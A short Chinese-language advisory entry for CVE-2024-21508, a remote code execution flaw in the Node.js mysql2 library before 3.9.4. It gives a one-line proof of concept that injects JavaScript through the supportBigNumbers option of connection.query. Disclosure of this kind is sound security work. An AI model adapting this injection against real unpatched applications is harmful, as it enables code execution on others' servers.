# CVE-2024-21508

>   mysql2是适用于Node.js的MySQL客户端库。

## 来源

[https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6591085](https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6591085)

## 简介

mysql2存在远程代码执行漏洞，由于readCodeFor函数中未正确验证supportBigNumbers和bigNumberStrings值，威胁者可通过构造恶意对象并将其作为参数传递给connection.query函数来执行恶意JavaScript代码，从而导致远程代码执行。

## 漏洞类型

远程代码执行

## 影响范围

-   mysql2(npm) < 3.9.4

## POC

```
connection.query({sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:"console.log(1337)"},reponseFunction)
```

## 漏洞细节

[https://blog.slonser.info/posts/mysql2-attacker-configuration/](https://blog.slonser.info/posts/mysql2-attacker-configuration/)
